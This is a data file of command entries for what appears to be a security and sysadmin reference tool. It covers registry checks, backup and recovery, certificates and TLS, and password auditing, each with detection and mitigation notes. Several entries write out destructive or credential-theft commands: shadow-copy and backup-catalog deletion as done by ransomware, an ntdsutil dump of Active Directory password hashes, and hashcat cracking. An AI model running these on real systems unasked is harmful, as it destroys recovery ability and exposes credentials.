 {"id":"reg-uac-settings","cat":"Windows Registry","title":"Read / weaken UAC policy keys","desc":"Inspect EnableLUA and ConsentPromptBehaviorAdmin; setting EnableLUA=0 disables UAC entirely.","team":"purple","danger":"AUTHORIZED USE ONLY. Disabling UAC removes an integrity boundary and needs a reboot; requires Administrator. Query first, change only with approval.","attack":["T1548.002"],"detect":"Sysmon Event ID 13 on EnableLUA / ConsentPromptBehaviorAdmin; Security 4657; sudden absence of consent prompts across a fleet.","mitigate":"Enforce UAC via GPO, alert on EnableLUA=0 or ConsentPromptBehaviorAdmin=0, and block registry writes to the Policies\\System key.","tags":["registry","windows","privesc","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin"}},
 {"id":"reg-defender-disable","cat":"Windows Registry","title":"Detect Defender registry tampering","desc":"Check the Windows Defender policy keys attackers set to impair AV (DisableAntiSpyware, DisableRealtimeMonitoring).","team":"purple","danger":"AUTHORIZED USE ONLY. These policy values disable protection; modern Tamper Protection usually blocks the write. Query for hunting, do not disable production AV.","attack":["T1562.001"],"detect":"Non-zero DisableAntiSpyware / DisableRealtimeMonitoring; Defender Event ID 5001/5010 (protection disabled); Sysmon Event ID 13 on the Windows Defender key.","mitigate":"Enable Tamper Protection, manage Defender exclusively via GPO/Intune, and alert on any write to HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender.","tags":["registry","windows","detection","incident-response"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring"}},
 {"id":"reg-usbstor-history","cat":"Windows Registry","title":"USB storage device history","desc":"Enumerate USBSTOR to recover connected removable-drive vendors, models, and serials for forensics.","team":"blue","tags":["registry","windows","forensics","triage"],"code":{"cmd":"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\" /s","ps":"Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR' | Select-Object -ExpandProperty Name"}},
 {"id":"reg-userassist","cat":"Windows Registry","title":"UserAssist execution artifacts","desc":"List UserAssist entries (ROT13-encoded GUI program run counts and last-run times) per user.","team":"blue","tags":["registry","windows","forensics","timeline"],"code":{"cmd":"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /s"}},
 {"id":"reg-hive-file-locations","cat":"Windows Registry","title":"Where the hive files live","desc":"Reference: system hives sit in System32\\config; each user's HKCU is NTUSER.DAT in their profile.","tags":["registry","windows","reference","forensics"],"code":{"cmd":"dir C:\\Windows\\System32\\config\ndir /a C:\\Users\\{{USER:you}}\\NTUSER.DAT","ps":"Get-ChildItem C:\\Windows\\System32\\config -Filter '*' | Where-Object { $_.Name -in 'SYSTEM','SOFTWARE','SAM','SECURITY','DEFAULT' }"}},
 {"id":"reg-key-acl","cat":"Windows Registry","title":"Inspect a key's permissions","desc":"Show the ACL on a registry key to spot weak permissions that allow persistence or privesc.","team":"blue","tags":["registry","windows","privesc","detection"],"code":{"ps":"Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{{SVC:Spooler}}' | Format-List"}},

/* ================= BACKUP & RECOVERY ================= */
 {"id":"bak-win-restore-point-create","cat":"Backup & Recovery","title":"Create a System Restore point","desc":"Create a Windows client restore point (Windows PowerShell 5.1; System Protection must be enabled).","danger":"Requires admin. Throttled to one auto point per 24h by default; consumes shadow storage.","tags":["backup","windows","quick-win"],"code":{"ps":"Checkpoint-Computer -Description \"{{DESC:Manual checkpoint}}\" -RestorePointType MODIFY_SETTINGS"}},
 {"id":"bak-win-restore-point-list","cat":"Backup & Recovery","title":"List System Restore points","desc":"Enumerate existing restore points with sequence numbers and timestamps (Windows PowerShell 5.1).","tags":["backup","windows","recovery"],"code":{"ps":"Get-ComputerRestorePoint | Format-Table SequenceNumber, Description, CreationTime -AutoSize"}},
 {"id":"bak-win-restore-point-revert","cat":"Backup & Recovery","title":"Revert to a System Restore point","desc":"Roll system files/registry back to a restore point by sequence number (Windows PowerShell 5.1).","danger":"Requires admin and reboots the machine; reverts system state. Confirm the sequence number first.","tags":["recovery","windows"],"code":{"ps":"Restore-Computer -RestorePoint {{SEQ:1}}"}},
 {"id":"bak-win-wbadmin-backup","cat":"Backup & Recovery","title":"Back up volumes with wbadmin","desc":"Create a bare-metal-capable backup of all critical volumes to a target disk with wbadmin.","danger":"Requires admin. Target volume contents may be overwritten; -quiet suppresses prompts.","tags":["backup","windows"],"code":{"cmd":"wbadmin start backup -backupTarget:{{DEST:E:}} -include:C: -allCritical -quiet"}},
 {"id":"bak-win-wbadmin-systemstate","cat":"Backup & Recovery","title":"Back up system state (registry/AD)","desc":"Capture system state (registry, boot files, and AD/SYSVOL on a DC) with wbadmin.","danger":"Requires admin. On a domain controller this includes the AD database; store securely.","tags":["backup","windows","active-directory"],"code":{"cmd":"wbadmin start systemstatebackup -backupTarget:{{DEST:E:}} -quiet"}},
 {"id":"bak-win-inhibit-recovery","cat":"Backup & Recovery","title":"Inhibit system recovery (ransomware precursor)","desc":"Catalog of native commands ransomware runs to delete shadow copies/backups and disable recovery.","danger":"Authorized IR/testing only. These commands destroy all local restore capability.","team":"blue","attack":["T1490"],"detect":"Process creation (Security 4688 / Sysmon 1) for vssadmin/wbadmin/bcdedit with delete/resize args; Windows Backup event 524 (catalog deleted); sudden shadow-storage drop.","mitigate":"Restrict local admin, keep immutable/off-host or air-gapped backups, enable EDR tamper protection, and alert on any 'vssadmin delete' or 'wbadmin delete'.","tags":["backup","windows","detection"],"code":{"cmd":"vssadmin delete shadows /all /quiet\nwbadmin delete catalog -quiet\nbcdedit /set {default} recoveryenabled no\nbcdedit /set {default} bootstatuspolicy ignoreallfailures"}},
 {"id":"bak-win-vss-create","cat":"Backup & Recovery","title":"Create a Volume Shadow Copy","desc":"Make a client-accessible VSS snapshot of C: for point-in-time file recovery (client OS supported).","danger":"Requires admin. Consumes shadow storage; old copies may be aged out under space pressure.","tags":["backup","windows","forensics"],"code":{"ps":"(Get-WmiObject -List Win32_ShadowCopy).Create('C:\\','ClientAccessible')"}},
 {"id":"bak-win-vss-mount","cat":"Backup & Recovery","title":"List and browse shadow copies","desc":"List shadow copies, then symlink one's device path to a folder to recover previous file versions.","danger":"Requires admin. Note the trailing backslash on the GLOBALROOT path or the symlink fails.","tags":["recovery","windows","forensics"],"code":{"cmd":"vssadmin list shadows\nmklink /d C:\\shadowmnt \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{{ID:1}}\\\""}},
 {"id":"bak-win-ntds-ifm","cat":"Backup & Recovery","title":"AD backup via ntdsutil IFM (dual-use)","desc":"ntdsutil Install-From-Media snapshots NTDS.dit + SYSTEM hive; the same technique is abused for credential theft.","danger":"Authorized DC backup/red-team only. Output contains every domain credential hash; treat as Tier-0 secret.","team":"blue","attack":["T1003.003"],"detect":"ntdsutil.exe / vssadmin on a DC (Sysmon 1, Security 4688); shadow copy creation on a DC; new ntds.dit copies (Sysmon 11) outside a backup window.","mitigate":"Limit DC logon to Tier-0 admins, enable Credential Guard, monitor VSS and ntdsutil on DCs, and alert on 'ifm' / 'create full'.","tags":["active-directory","windows","password"],"code":{"cmd":"ntdsutil \"activate instance ntds\" \"ifm\" \"create full {{DEST:C:\\ADBackup}}\" quit quit"}},
 {"id":"bak-mac-timemachine-info","cat":"Backup & Recovery","title":"Time Machine status and backups","desc":"Show configured destinations, the latest backup, and all available backups with tmutil.","tags":["backup","macos","recovery"],"code":{"mac":"tmutil destinationinfo\ntmutil latestbackup\ntmutil listbackups"}},
 {"id":"bak-mac-timemachine-start","cat":"Backup & Recovery","title":"Run a Time Machine backup now","desc":"Trigger an immediate Time Machine backup and block until it completes with tmutil.","danger":"Requires sudo. Time Machine must already have a configured destination.","tags":["backup","macos"],"code":{"mac":"sudo tmutil startbackup --block"}},
 {"id":"bak-mac-localsnapshot","cat":"Backup & Recovery","title":"APFS local Time Machine snapshots","desc":"Create, list, and delete on-disk APFS local snapshots used by Time Machine with tmutil.","danger":"Deleting snapshots (sudo) permanently removes those point-in-time recovery points.","tags":["backup","macos","forensics"],"code":{"mac":"tmutil localsnapshot\ntmutil listlocalsnapshots /\nsudo tmutil deletelocalsnapshots {{DATE:2026-07-02-000000}}"}},
 {"id":"bak-rsync-mirror","cat":"Backup & Recovery","title":"Incremental mirror backup with rsync","desc":"Mirror a tree preserving permissions, ACLs, and extended attributes; only changed data is copied.","danger":"--delete removes files at the destination that no longer exist in the source. Verify paths first.","tags":["backup","cross-platform","file-transfer"],"code":{"linux":"rsync -aAXv --delete {{SRC:/home/user/}} {{DEST:/mnt/backup/}}","mac":"rsync -aAXv --delete {{SRC:/Users/me/}} {{DEST:/Volumes/backup/}}"}},
 {"id":"bak-tar-archive","cat":"Backup & Recovery","title":"Create a compressed tar archive","desc":"Archive a directory to a gzip-compressed tarball, preserving permissions (BSD and GNU tar).","tags":["backup","linux","macos"],"code":{"linux":"tar -czpvf {{OUT:backup.tar.gz}} {{SRC:/etc}}","mac":"tar -czpvf {{OUT:backup.tar.gz}} {{SRC:/etc}}"}},
 {"id":"bak-tar-restore","cat":"Backup & Recovery","title":"Restore from a tar archive","desc":"Extract a gzip tarball into a target directory, restoring stored permissions.","danger":"Extracting with -C to a live path (e.g. /) overwrites existing files. Inspect with -tzf first.","tags":["recovery","linux","macos"],"code":{"linux":"tar -xzpvf {{ARCHIVE:backup.tar.gz}} -C {{DEST:/restore}}","mac":"tar -xzpvf {{ARCHIVE:backup.tar.gz}} -C {{DEST:/restore}}"}},
 {"id":"bak-dd-image","cat":"Backup & Recovery","title":"Raw disk image with dd","desc":"Clone a whole block device to a raw image for forensic or full-disk backup.","danger":"Requires sudo. A wrong of= target irreversibly overwrites a disk. Confirm device names carefully.","tags":["backup","forensics","recovery"],"code":{"linux":"sudo dd if={{DEV:/dev/sdb}} of={{OUT:disk.img}} bs=4M conv=noerror,sync status=progress","mac":"sudo dd if={{DEV:/dev/disk2}} of={{OUT:disk.img}} bs=4m  # press Ctrl-T for progress"}},
 {"id":"bak-lvm-snapshot","cat":"Backup & Recovery","title":"LVM snapshot for consistent backup","desc":"Create a copy-on-write LVM snapshot to back up a volume at a consistent point in time (Linux).","danger":"Requires sudo. Snapshot fills as origin changes; if it runs out of space it becomes invalid.","tags":["backup","linux"],"code":{"linux":"sudo lvcreate -L {{SIZE:2G}} -s -n {{NAME:snap0}} {{LV:/dev/vg0/root}}"}},
 {"id":"bak-borg","cat":"Backup & Recovery","title":"Deduplicated encrypted backups (Borg)","desc":"Initialize an encrypted repo and create a dedup/compressed archive with BorgBackup (install borgbackup).","danger":"Store the repokey passphrase safely; losing it makes an encrypted repo unrecoverable.","tags":["backup","tools","cross-platform"],"code":{"linux":"borg init --encryption=repokey {{REPO:/mnt/borg}}\nborg create {{REPO:/mnt/borg}}::backup-{{DATE:2026-07-02}} {{SRC:/home}}","mac":"borg init --encryption=repokey {{REPO:/Volumes/borg}}\nborg create {{REPO:/Volumes/borg}}::backup-{{DATE:2026-07-02}} {{SRC:/Users}}"}},
 {"id":"bak-restic","cat":"Backup & Recovery","title":"Fast encrypted snapshots (restic)","desc":"Initialize an encrypted repository and snapshot a directory with restic (install restic).","danger":"The repository password is required to restore; there is no recovery if it is lost.","tags":["backup","tools","cross-platform"],"code":{"linux":"restic init --repo {{REPO:/mnt/restic}}\nrestic -r {{REPO:/mnt/restic}} backup {{SRC:/home}}","mac":"restic init --repo {{REPO:/Volumes/restic}}\nrestic -r {{REPO:/Volumes/restic}} backup {{SRC:/Users}}","ps":"restic init --repo {{REPO:E:\\restic}}\nrestic -r {{REPO:E:\\restic}} backup {{SRC:C:\\Users}}"}},
 {"id":"bak-testdisk","cat":"Backup & Recovery","title":"Recover lost partitions (TestDisk)","desc":"Rebuild partition tables and repair boot sectors interactively with TestDisk (install testdisk).","danger":"Requires sudo. Writing a rebuilt partition table can worsen data loss; work on an image copy when possible.","tags":["recovery","forensics","tools"],"code":{"linux":"sudo testdisk {{IMAGE_OR_DEV:/dev/sdb}}","mac":"sudo testdisk {{DEV:/dev/disk2}}"}},
 {"id":"bak-photorec","cat":"Backup & Recovery","title":"Carve deleted files (PhotoRec)","desc":"Signature-based file carving to recover deleted files from a disk or image with PhotoRec (install testdisk).","danger":"Requires sudo. Always recover to a different disk than the source to avoid overwriting evidence.","tags":["recovery","forensics","tools"],"code":{"linux":"sudo photorec {{DEV:/dev/sdb}}","mac":"sudo photorec {{DEV:/dev/disk2}}"}},
 {"id":"bak-win-bitlocker-key","cat":"Backup & Recovery","title":"Retrieve BitLocker recovery key","desc":"Display BitLocker protectors and the 48-digit recovery password before re-imaging (Windows).","danger":"Requires admin. Exposes the recovery key that unlocks the drive; handle and store securely.","tags":["recovery","windows","password"],"code":{"ps":"(Get-BitLockerVolume -MountPoint 'C:').KeyProtector | Format-List KeyProtectorType, RecoveryPassword","cmd":"manage-bde -protectors -get C:"}},
 {"id":"bak-mac-filevault-key","cat":"Backup & Recovery","title":"Check FileVault status and recovery key","desc":"Show FileVault encryption status and whether a personal recovery key exists with fdesetup (macOS).","danger":"Requires sudo. Confirm a recovery key exists before disabling/rotating credentials to avoid lockout.","tags":["recovery","macos","password"],"code":{"mac":"fdesetup status\nsudo fdesetup haspersonalrecoverykey"}},
 {"id":"bak-checksum-verify","cat":"Backup & Recovery","title":"Verify backup integrity with SHA-256","desc":"Hash a backup and verify it against a stored checksum to detect corruption or tampering.","tags":["backup","cross-platform","quick-win"],"code":{"linux":"sha256sum {{FILE:backup.tar.gz}} > sums.txt\nsha256sum -c sums.txt","mac":"shasum -a 256 {{FILE:backup.tar.gz}} > sums.txt\nshasum -a 256 -c sums.txt","ps":"Get-FileHash {{FILE:backup.tar.gz}} -Algorithm SHA256","cmd":"certutil -hashfile {{FILE:backup.tar.gz}} SHA256"}},

/* ================= CERTIFICATES & TLS ================= */
 {"id":"crt-inspect-cert","cat":"Certificates & TLS","title":"Inspect an X.509 certificate file","desc":"Dump the full human-readable contents of a PEM/DER certificate.","tags":["certificates","tls","reference"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -text","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -text","cmd":"certutil -dump {{FILE:cert.cer}}","ps":"Get-PfxCertificate {{FILE:cert.cer}} | Format-List *","py":"python3 -c \"import ssl;print(ssl._ssl._test_decode_cert('{{FILE:cert.pem}}'))\""}},
 {"id":"crt-subject-issuer","cat":"Certificates & TLS","title":"Show certificate subject, issuer and dates","desc":"Quick one-line summary of who a cert is for, who signed it, and validity window.","tags":["certificates","tls","quick-win"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -subject -issuer -dates","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -subject -issuer -dates","ps":"$c=Get-PfxCertificate {{FILE:cert.cer}}; $c | Format-List Subject,Issuer,NotBefore,NotAfter"}},
 {"id":"crt-check-expiry","cat":"Certificates & TLS","title":"Check certificate expiry date","desc":"Print the notAfter date of a certificate file.","tags":["certificates","tls","quick-win"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -enddate","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -enddate","ps":"(Get-PfxCertificate {{FILE:cert.cer}}).NotAfter","py":"python3 -c \"import ssl;print(ssl._ssl._test_decode_cert('{{FILE:cert.pem}}')['notAfter'])\""}},
 {"id":"crt-checkend","cat":"Certificates & TLS","title":"Test if a cert expires within N seconds","desc":"Scriptable check: exit 0 if the cert is still valid past the window, 1 if it will expire.","tags":["certificates","tls","automation"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -checkend {{SECONDS:604800}}; echo \"expiring=$?\"","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -checkend {{SECONDS:604800}}; echo \"expiring=$?\""}},
 {"id":"crt-fingerprint","cat":"Certificates & TLS","title":"Compute a certificate fingerprint","desc":"SHA-256 fingerprint of a cert for pinning/comparison (Windows Thumbprint is SHA-1).","tags":["certificates","tls","detection"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -fingerprint -sha256","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -fingerprint -sha256","ps":"(Get-PfxCertificate {{FILE:cert.cer}}).Thumbprint"}},
 {"id":"crt-san-check","cat":"Certificates & TLS","title":"List Subject Alternative Names (SAN)","desc":"Show the DNS/IP names a cert actually covers — modern clients ignore CN.","tags":["certificates","tls","enumeration"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -ext subjectAltName","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -ext subjectAltName"}},
 {"id":"crt-gen-key","cat":"Certificates & TLS","title":"Generate a private key (RSA or EC)","desc":"Create an unencrypted RSA-2048 or P-256 EC private key.","danger":"Writes a private key to disk unencrypted; protect the file and never commit it.","tags":["certificates","tls"],"code":{"mac":"openssl genrsa -out {{KEY:key.pem}} 2048   # EC: openssl ecparam -name prime256v1 -genkey -noout -out {{KEY:key.pem}}","linux":"openssl genrsa -out {{KEY:key.pem}} 2048   # EC: openssl ecparam -name prime256v1 -genkey -noout -out {{KEY:key.pem}}"}},
 {"id":"crt-gen-csr","cat":"Certificates & TLS","title":"Generate a CSR and key","desc":"Create a certificate signing request plus a new key to send to a CA.","danger":"Writes a new private key; keep it secret and submit only the .csr to the CA.","tags":["certificates","tls"],"code":{"mac":"openssl req -new -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CSR:req.csr}} -subj \"/CN={{CN:example.com}}\"","linux":"openssl req -new -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CSR:req.csr}} -subj \"/CN={{CN:example.com}}\""}},
 {"id":"crt-gen-selfsigned","cat":"Certificates & TLS","title":"Generate a self-signed certificate","desc":"Create a key + self-signed cert with a SAN for local testing/labs.","danger":"For test/lab use only; self-signed certs are not trusted by clients. Writes key + cert to disk.","tags":["certificates","tls"],"code":{"mac":"openssl req -x509 -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CERT:cert.pem}} -days {{DAYS:365}} -subj \"/CN={{CN:example.com}}\" -addext \"subjectAltName=DNS:{{CN:example.com}}\"","linux":"openssl req -x509 -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CERT:cert.pem}} -days {{DAYS:365}} -subj \"/CN={{CN:example.com}}\" -addext \"subjectAltName=DNS:{{CN:example.com}}\"","ps":"New-SelfSignedCertificate -DnsName {{CN:example.com}} -CertStoreLocation Cert:\\CurrentUser\\My"}},
 {"id":"crt-verify-chain","cat":"Certificates & TLS","title":"Verify a certificate against a CA chain","desc":"Validate a leaf cert, supplying intermediates with -untrusted if needed.","tags":["certificates","tls","detection"],"code":{"mac":"openssl verify -CAfile {{CA:ca.pem}} -untrusted {{CHAIN:intermediates.pem}} {{CERT:cert.pem}}","linux":"openssl verify -CAfile {{CA:ca.pem}} -untrusted {{CHAIN:intermediates.pem}} {{CERT:cert.pem}}","cmd":"certutil -verify -urlfetch {{CERT:cert.cer}}"}},
 {"id":"crt-s-client-connect","cat":"Certificates & TLS","title":"TLS handshake with a server (s_client)","desc":"Open a TLS connection and view the negotiated protocol, cipher and presented cert.","tags":["tls","network","banner"],"code":{"mac":"openssl s_client -connect {{HOST:example.com}}:{{PORT:443}} -servername {{HOST:example.com}} </dev/null","linux":"openssl s_client -connect {{HOST:example.com}}:{{PORT:443}} -servername {{HOST:example.com}} </dev/null"}},
 {"id":"crt-s-client-showcerts","cat":"Certificates & TLS","title":"Dump the full chain a server sends","desc":"Show every certificate the server presents to diagnose missing intermediates.","tags":["tls","network","enumeration"],"code":{"mac":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} -showcerts </dev/null","linux":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} -showcerts </dev/null"}},
 {"id":"crt-remote-expiry","cat":"Certificates & TLS","title":"Check a live server's cert expiry","desc":"Fetch the leaf cert over TLS and print its expiry without saving it.","tags":["tls","network","quick-win"],"code":{"mac":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -enddate","linux":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -enddate","ps":"$h='{{HOST:example.com}}';$c=[Net.Sockets.TcpClient]::new($h,443);$s=[Net.Security.SslStream]::new($c.GetStream());$s.AuthenticateAsClient($h);([Security.Cryptography.X509Certificates.X509Certificate2]$s.RemoteCertificate).NotAfter;$s.Dispose();$c.Dispose()","py":"python3 -c \"import ssl,socket;ctx=ssl.create_default_context();s=ctx.wrap_socket(socket.socket(),server_hostname='{{HOST:example.com}}');s.connect(('{{HOST:example.com}}',443));print(s.getpeercert()['notAfter'])\""}},
 {"id":"crt-get-server-cert","cat":"Certificates & TLS","title":"Save a server's certificate to a file","desc":"Retrieve the leaf certificate in PEM form for offline inspection.","tags":["tls","network","recon"],"code":{"mac":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} </dev/null 2>/dev/null | openssl x509 -out {{OUT:server.pem}}","linux":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} </dev/null 2>/dev/null | openssl x509 -out {{OUT:server.pem}}","py":"python3 -c \"import ssl;open('{{OUT:server.pem}}','w').write(ssl.get_server_certificate(('{{HOST:example.com}}',443)))\""}},
 {"id":"crt-convert-pem-der","cat":"Certificates & TLS","title":"Convert between PEM and DER","desc":"Swap a certificate between base64 PEM (.pem/.crt) and binary DER (.der/.cer).","tags":["certificates","tls"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -outform DER -out cert.der   # DER->PEM: openssl x509 -inform DER -in cert.der -out cert.pem","linux":"openssl x509 -in {{FILE:cert.pem}} -outform DER -out cert.der   # DER->PEM: openssl x509 -inform DER -in cert.der -out cert.pem","cmd":"certutil -decode {{FILE:cert.pem}} cert.der   :: DER->PEM: certutil -encode cert.der cert.pem"}},
 {"id":"crt-pfx-extract","cat":"Certificates & TLS","title":"Extract cert and key from a PFX/PKCS12","desc":"Pull the certificate and private key out of a .pfx/.p12 bundle into PEM.","danger":"Outputs the private key unencrypted (-nodes); handle the resulting PEM securely.","tags":["certificates","tls"],"code":{"mac":"openssl pkcs12 -in {{FILE:bundle.pfx}} -nodes -out out.pem   # add -passin pass:{{PW}} to avoid prompt","linux":"openssl pkcs12 -in {{FILE:bundle.pfx}} -nodes -out out.pem   # add -passin pass:{{PW}} to avoid prompt","ps":"Get-PfxData -FilePath {{FILE:bundle.pfx}} -Password (Read-Host -AsSecureString)"}},
 {"id":"crt-create-pfx","cat":"Certificates & TLS","title":"Bundle cert + key into a PFX","desc":"Package a certificate and its key into a password-protected PKCS12 file.","danger":"Creates a file containing the private key; set a strong export password and protect it.","tags":["certificates","tls"],"code":{"mac":"openssl pkcs12 -export -in {{CERT:cert.pem}} -inkey {{KEY:key.pem}} -out bundle.pfx","linux":"openssl pkcs12 -export -in {{CERT:cert.pem}} -inkey {{KEY:key.pem}} -out bundle.pfx","ps":"Export-PfxCertificate -Cert Cert:\\CurrentUser\\My\\{{THUMBPRINT}} -FilePath bundle.pfx -Password (Read-Host -AsSecureString)"}},
 {"id":"crt-key-cert-match","cat":"Certificates & TLS","title":"Confirm a key matches a certificate","desc":"Compare the public-key hash of a cert and key — matching MD5s mean they pair.","tags":["certificates","tls","detection"],"code":{"mac":"openssl x509 -noout -modulus -in {{CERT:cert.pem}} | openssl md5; openssl rsa -noout -modulus -in {{KEY:key.pem}} | openssl md5","linux":"openssl x509 -noout -modulus -in {{CERT:cert.pem}} | openssl md5; openssl rsa -noout -modulus -in {{KEY:key.pem}} | openssl md5"}},
 {"id":"crt-view-csr","cat":"Certificates & TLS","title":"Inspect and self-check a CSR","desc":"Print a certificate signing request's contents and verify its signature.","tags":["certificates","tls","reference"],"code":{"mac":"openssl req -in {{CSR:req.csr}} -noout -text -verify","linux":"openssl req -in {{CSR:req.csr}} -noout -text -verify"}},
 {"id":"crt-tls-version-enum","cat":"Certificates & TLS","title":"Enumerate TLS versions a server accepts","desc":"Probe which TLS protocol versions a host negotiates to flag legacy TLS 1.0/1.1.","team":"purple","danger":"Authorized-use only: probe hosts you own or have written permission to assess.","tags":["tls","scanning","network"],"attack":["T1046"],"detect":"Server TLS/proxy logs and IDS show repeated short-lived handshakes from one source cycling protocol versions.","mitigate":"Disable TLS 1.0/1.1, require TLS 1.2+, and alert on handshakes negotiating deprecated versions.","code":{"mac":"for v in tls1 tls1_1 tls1_2 tls1_3; do echo -n \"$v: \"; echo | openssl s_client -connect {{HOST:example.com}}:443 -$v 2>/dev/null | grep -q 'Cipher' && echo ok || echo no; done","linux":"for v in tls1 tls1_1 tls1_2 tls1_3; do echo -n \"$v: \"; echo | openssl s_client -connect {{HOST:example.com}}:443 -$v 2>/dev/null | grep -q 'Cipher' && echo ok || echo no; done"}},
 {"id":"crt-list-ciphers","cat":"Certificates & TLS","title":"List cipher suites your OpenSSL supports","desc":"Expand a cipher string (e.g. HIGH) into the concrete suites the local build offers.","tags":["tls","reference"],"code":{"mac":"openssl ciphers -v '{{SPEC:HIGH:!aNULL}}'","linux":"openssl ciphers -v '{{SPEC:HIGH:!aNULL}}'"}},
 {"id":"crt-ocsp-uri","cat":"Certificates & TLS","title":"Find a cert's OCSP responder and CRL","desc":"Extract the revocation-checking URLs embedded in a certificate.","tags":["certificates","tls","detection"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -ocsp_uri; openssl x509 -in {{FILE:cert.pem}} -noout -text | grep -A1 'CRL Distribution'","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -ocsp_uri; openssl x509 -in {{FILE:cert.pem}} -noout -text | grep -A1 'CRL Distribution'"}},
 {"id":"crt-ca-store-linux","cat":"Certificates & TLS","title":"Trust a CA in the Linux system store","desc":"Add a CA to the OS trust anchor set (paths differ Debian vs RHEL).","danger":"Requires root and trusting a CA system-wide affects all TLS validation; only add CAs you trust.","tags":["certificates","tls","linux"],"code":{"linux":"sudo cp {{CA:myca.crt}} /usr/local/share/ca-certificates/ && sudo update-ca-certificates   # RHEL: cp to /etc/pki/ca-trust/source/anchors/ && sudo update-ca-trust extract   # list: trust list"}},
 {"id":"crt-ca-store-macos","cat":"Certificates & TLS","title":"Trust / list CAs in macOS keychain","desc":"Add a trusted root to the System keychain, or list existing certs.","danger":"add-trusted-cert needs sudo and modifies system trust; only trust CAs you control.","tags":["certificates","tls","macos"],"code":{"mac":"sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain {{CA:myca.cer}}   # list: security find-certificate -a -p /System/Library/Keychains/SystemRootCertificates.keychain"}},
 {"id":"crt-win-cert-store","cat":"Certificates & TLS","title":"Browse Windows certificate stores","desc":"List certs in the user/machine stores via the Cert: drive or certutil.","tags":["certificates","tls","windows"],"code":{"ps":"Get-ChildItem Cert:\\CurrentUser\\My; Get-ChildItem Cert:\\LocalMachine\\Root | Select-Object Subject,NotAfter,Thumbprint","cmd":"certutil -store My & certutil -user -store My & certutil -store Root"}},

/* ================= PASSWORD AUDITING ================= */
 {"id":"pw-hashid","cat":"Password Auditing","title":"Identify a hash type","desc":"Guess a hash's algorithm (and hashcat mode) before cracking. Requires hashid.","tags":["password","recon"],"code":{"linux":"hashid '{{HASH}}'\n# also print candidate hashcat -m mode numbers:\nhashid -m '{{HASH}}'","mac":"hashid '{{HASH}}'\nhashid -m '{{HASH}}'"}},
 {"id":"pw-hashcat-modes","cat":"Password Auditing","title":"Find the hashcat mode number","desc":"Look up the -m mode number for a hash type from hashcat's built-in list. Requires hashcat.","tags":["password","reference"],"code":{"linux":"hashcat --help | grep -i '{{TYPE:ntlm}}'","mac":"hashcat --help | grep -i '{{TYPE:ntlm}}'","ps":"hashcat.exe --help | Select-String '{{TYPE:ntlm}}'"}},
 {"id":"pw-hashcat-dict","cat":"Password Auditing","title":"Dictionary attack (hashcat)","desc":"Straight wordlist attack against a hash file. Requires hashcat.","danger":"Authorized password-audit engagements only; crack only hashes you are permitted to test.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline cracking runs on attacker hardware and is invisible to the target; detect the upstream hash theft (SAM/NTDS/LSASS access, exported hash files) that feeds it.","mitigate":"Enforce long passphrases and slow adaptive hashes (bcrypt/argon2/scrypt); rotate any credential whose hash may have been exposed.","code":{"linux":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}}"}},
